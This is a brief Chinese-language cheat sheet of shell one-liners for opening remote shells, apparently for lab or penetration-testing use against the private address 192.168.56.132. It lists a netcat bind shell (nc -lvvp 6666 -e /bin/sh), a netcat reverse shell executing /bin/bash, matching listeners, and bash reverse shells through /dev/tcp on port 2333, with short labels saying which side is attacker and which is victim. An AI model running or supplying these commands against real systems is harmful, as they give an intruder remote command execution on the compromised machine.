
# 脚本
## 主动shell
nc -lvvp 6666 -e /bin/sh   主动shell

nc 192.168.56.132 6666  攻击机联

## 反弹shell
nc 192.168.56.132 4444 -e /bin/bash    被攻击主动的联 132
nc -lp 4444     攻击机可以处理
  
##

bash -i >& /dev/tcp/192.168.56.132/2333 0>&1


bash -i > /dev/tcp/192.168.56.132/2333